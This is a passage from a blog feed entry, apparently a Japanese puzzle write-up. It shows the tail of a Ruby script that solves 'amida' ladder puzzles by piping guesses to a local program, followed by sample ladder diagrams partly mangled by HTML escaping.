</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">puts</span> <span class="n">ans</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="n">pnum</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>  <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;|./amida_mod&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">io</span><span class="o">|</span>
</span><span class='line'>    <span class="n">playback</span><span class="p">(</span><span class="n">answers</span><span class="p">,</span> <span class="n">io</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">problem</span> <span class="o">=</span> <span class="n">read_problem</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span><span class='line'>      <span class="no">IO</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;amida2_problem_</span><span class="si">#{</span><span class="n">pnum</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">problem</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">io</span><span class="o">.</span><span class="n">puts</span> <span class="n">n</span>
</span><span class='line'>      <span class="n">io</span><span class="o">.</span><span class="n">flush</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">gets</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s1">&#39;Wrong&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>      <span class="k">elsif</span> <span class="o">!</span><span class="n">result</span><span class="o">.</span><span class="n">include?</span><span class="p">(</span><span class="s1">&#39;No.&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">puts</span> <span class="s2">&quot;&gt;&gt;&gt; </span><span class="si">#{</span><span class="n">result</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">answers</span> <span class="o">&lt;&lt;</span> <span class="n">n</span>
</span><span class='line'>      <span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>      <span class="nb">puts</span>
</span><span class='line'>      <span class="nb">warn</span> <span class="s2">&quot;solved: </span><span class="si">#{</span><span class="n">pnum</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>      <span class="n">pnum</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>問題例</h2>

<p><a href="https://gist.github.com/mayth/56bde157140dd52e260c">gist</a></p>

<p><figure class='code'><figcaption><span>Problem Samples </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1 2 3 4 5 6 7 8
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| | | | | |-| |
</span><span class='line'>| | | | | | |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| | |-| |-| |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | | | |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>| | |-| | | |-|
</span><span class='line'>|-| | | |-| | |
</span><span class='line'>| | |-| | |-| |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>| | |-| | | |-|
</span><span class='line'>| | | | | |-| |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>              *&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>1 2 3 4 5 6 7 8
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>| | |-| | |-| |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>| | | | | | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| | | |-| | |-|
</span><span class='line'>|-| | | | | | |
</span><span class='line'>| |-| | |-| | |
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| |-| |-| |
</span><span class='line'>|-| | | | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>            *&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>    *      
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>|-| |-| | | | |
</span><span class='line'>| |-| | | | |-|
</span><span class='line'>|-| | |-| | | |
</span><span class='line'>| |-| | |-| |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>| |-| |-| |-| |
</span><span class='line'>| | | | | | | |
</span><span class='line'>| |-| | | |-| |
</span><span class='line'>|-| |-| |-| | |
</span><span class='line'>| |-| |-| | |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>|-| | | |-| |-|
</span><span class='line'>| | |-| | | | |
</span><span class='line'>| | | | |-| | |
</span><span class='line'>|-| |-| | |-| |
</span><span class='line'>| | | | | | | |
</span><span class='line'>| | | | | |-| |
</span><span class='line'>|-| |-| | | |-|
</span><span class='line'>| |-| | |-| | |
</span><span class='line'>8 7 6 5 4 3 2 1&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>             *    
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>|-|  |  |  |  |&ndash;|   |
</span><span class='line'>| |  |&ndash;|  |&ndash;|  |   |
</span><span class='line'>| |&ndash;|  |  |  |  |   |
</span><span class='line'>|-|  |  |  |  |  |&mdash;|
</span><span class='line'>| |  |  |  |&ndash;|  |   |
</span><span class='line'>|-|  |&ndash;|  |  |  |&mdash;|
</span><span class='line'>| |  |  |&ndash;|  |  |   |
</span><span class='line'>| |  |&ndash;|  |  |&ndash;|   |
</span><span class='line'>| |&ndash;|  |  |&ndash;|  |   |
</span><span class='line'>|-|  |  |&ndash;|  |  |&mdash;|
</span><span class='line'>| |  |&ndash;|  |  |&ndash;|   |
</span><span class='line'>| |&ndash;|  |&ndash;|  |  |&mdash;|
</span><span class='line'>|-|  |&ndash;|  |  |&ndash;|   |
</span><span class='line'>| |&ndash;|  |  |  |  |&mdash;|
</span><span class='line'>| |  |  |&ndash;|  |&ndash;|   |
</span><span class='line'>| |&ndash;|  |  |&ndash;|  |   |
</span><span class='line'>| |  |  |&ndash;|  |  |&mdash;|
</span><span class='line'>| |  |&ndash;|  |  |&ndash;|   |
</span><span class='line'>| |&ndash;|  |&ndash;|  |  |&mdash;|
</span><span class='line'>1 2  3  4  5  6  7   8&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>1&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>  | |  |  | | |  | &lt;br/>
</span><span class='line'>2&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'> | | |   | | | |   &lt;br/>
</span><span class='line'>3&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>  |   |   | | |    &lt;br/>
</span><span class='line'>4&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-*
</span><span class='line'>   |   | |      | |&lt;br/>
</span><span class='line'>5&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>     |      |  | | &lt;br/>
</span><span class='line'>6&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>    |     |  |     |
</span><span class='line'>7&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-
</span><span class='line'>   |  | |  |   |  |&lt;br/>
</span><span class='line'>8&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-1
</span><span class='line'> | |   | | |  |  | &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-2
</span><span class='line'>  |  |  |    |  |  |
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-3
</span><span class='line'>   |          |   |&lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-4
</span><span class='line'>  |  | |   | | | | &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-5
</span><span class='line'> |  | |   |   | |  &lt;br/>
</span><span class='line'>*&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-6
</span><span class='line'>        |   |  |   &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-7
</span><span class='line'> | | | | | |  | | |&lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-8&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-1
</span><span class='line'>       |    |      |
</span><span class='line'>       |    |      |
</span><span class='line'>*&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-2
</span><span class='line'>   | |     | | | | &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-3
</span><span class='line'> |    |  |    |    |
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-4
</span><span class='line'>  | |  |  |  |  | |&lt;br/>
</span><span class='line'>  | |  |  |  |  | |&lt;br/>
</span><span class='line'>  | |  |  |  |  | |&lt;br/>
</span><span class='line'>  | |  |  |  |  | |&lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-5
</span><span class='line'> |       |  |  | | |
</span><span class='line'> |       |  |  | | |
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-6
</span><span class='line'>  | | | |  | |  |  &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-7
</span><span class='line'> |     | |  |  |   &lt;br/>
</span><span class='line'> |     | |  |  |   &lt;br/>
</span><span class='line'> &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-8</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
